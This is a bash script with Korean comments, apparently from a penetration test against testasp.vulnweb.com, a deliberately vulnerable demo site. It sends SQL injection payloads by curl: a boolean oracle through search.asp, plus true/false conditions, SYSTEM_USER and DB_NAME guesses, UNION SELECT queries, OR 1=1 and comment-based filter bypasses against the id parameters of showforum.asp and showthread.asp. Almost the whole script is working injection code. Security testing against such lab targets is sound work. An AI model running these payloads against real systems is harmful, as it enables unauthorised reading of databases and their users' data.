#!/usr/bin/env bash
# Round 7 Part B2 — (1) 삭제 임계값 상한 정밀 측정  (2) id SQLi (GET, 읽기 전용)
# 대상은 우리가 만든 스레드 id=9 및 그 포럼 id=0. DELETE 분기는 POST 핸들러에만 존재(소스 확정).
set -u
BASE="http://testasp.vulnweb.com"
D="$(cd "$(dirname "$0")" && pwd)"; OUT="$D/out"; JAR="$OUT/b_session.jar"
CURL=(curl -s --noproxy '*' --max-time 30)
OUR=$(cat "$OUT/b_our_thread_id.txt" 2>/dev/null || echo 9)

oracle() { "${CURL[@]}" -G --data-urlencode "tfSearch=zzq')>0 OR ($1))--" "$BASE/search.asp" \
             | grep -c "class='posttext'" || true; }

echo "### C1. 삭제 트리거가 참조하는 두 COUNT 의 상한 정밀 측정 (읽기 전용)"
for tgt in "posts" "threads"; do
  lo=0; hi=100
  printf "  COUNT(*) FROM %-8s : " "$tgt"
  for n in 3 10 25 50 100; do
    r=$(oracle "(SELECT COUNT(*) FROM $tgt)>$n")
    if [ "$r" = "0" ]; then printf "> %-3s = FALSE  " "$n"; else printf "> %-3s = TRUE   " "$n"; fi
  done
  echo "→ 상한 < 100 확인"
done
echo "  (참고) posts 조인 렌더 행수(TRUE 오라클): $(oracle '1=1')"

echo
echo "### C2. /showforum.asp?id= — SQLi 검증 (GET, 읽기 전용)"
sf() { printf "  %-58s " "$1"
  "${CURL[@]}" -b "$JAR" -o "$OUT/c_sf_$2.html" -w "%{http_code} %{size_download}" "$BASE/showforum.asp?id=$3"
  echo "  fname=$(grep -oE '<div class="forumtitle">[^<]*' "$OUT/c_sf_$2.html" | head -1 | sed 's/.*>//') threadlinks=$(grep -o 'showthread\.asp?id=[0-9]*' "$OUT/c_sf_$2.html" | wc -l)"; }
sf "baseline id=0"                                   base        "0"
sf "id=1 (다른 포럼 → 다른 이름이면 정상 동작)"          other       "1"
sf "id=0 AND 1=1 (TRUE)"                             t1          "0 AND 1=1"
sf "id=0 AND 1=2 (FALSE)"                            f1          "0 AND 1=2"
sf "id=0 AND (SELECT SYSTEM_USER)='acunetix' (TRUE)"  t2          "0 AND (SELECT SYSTEM_USER)='acunetix'"
sf "id=0 AND (SELECT SYSTEM_USER)='sa' (FALSE)"       f2          "0 AND (SELECT SYSTEM_USER)='sa'"
sf "id=0 AND (SELECT DB_NAME())='acuforum' (TRUE)"    t3          "0 AND (SELECT DB_NAME())='acuforum'"
sf "오류기반 id=0'"                                    err         "0'"
sf "UNION 2컬럼 id=0 UNION SELECT name,descr..."      uniona      "0 UNION SELECT name,descr FROM forums WHERE id=1"
sf "주석형 id=0--"                                     cmt         "0--"

echo
echo "### C3. /showthread.asp?id= — SQLi 검증 (GET, 읽기 전용, 대상 = 우리 스레드 $OUR)"
st() { printf "  %-58s " "$1"
  "${CURL[@]}" -b "$JAR" -o "$OUT/c_st_$2.html" -w "%{http_code} %{size_download}" "$BASE/showthread.asp?id=$3"
  echo "  posts=$(grep -c "class='posttext'" "$OUT/c_st_$2.html")"; }
st "baseline id=$OUR (우리 스레드, 2건)"                  base   "$OUR"
st "id=$OUR AND 1=1 (TRUE)"                            t1     "$OUR AND 1=1"
st "id=$OUR AND 1=2 (FALSE)"                           f1     "$OUR AND 1=2"
st "id=$OUR AND (SELECT COUNT(*) FROM posts WHERE threadid=$OUR)=2" t2 "$OUR AND (SELECT COUNT(*) FROM posts WHERE threadid=$OUR)=2"
st "id=$OUR AND (SELECT COUNT(*) FROM posts WHERE threadid=$OUR)=99" f2 "$OUR AND (SELECT COUNT(*) FROM posts WHERE threadid=$OUR)=99"
st "오류기반 id=$OUR'"                                   err    "$OUR'"
st "id=$OUR OR 1=1 (다른 스레드 글까지 노출)"              orall  "$OUR OR 1=1"
st "UNION 4컬럼 id=$OUR UNION SELECT 'T',0,$OUR,'U'"      uniona "$OUR UNION SELECT 'T',0,$OUR,'U'"
echo
echo "### C4. '/'·'--' 차단 여부 및 괄호/주석 동작"
printf "  %-58s " "showthread id=$OUR/**/AND/**/1=1"; "${CURL[@]}" -b "$JAR" -o /dev/null -w "%{http_code} %{size_download}\n" "$BASE/showthread.asp?id=$OUR/**/AND/**/1=1"
printf "  %-58s " "showthread id=$OUR)+AND+(1=1";      "${CURL[@]}" -b "$JAR" -o /dev/null -w "%{http_code} %{size_download}\n" "$BASE/showthread.asp?id=$OUR)+AND+(1=1"
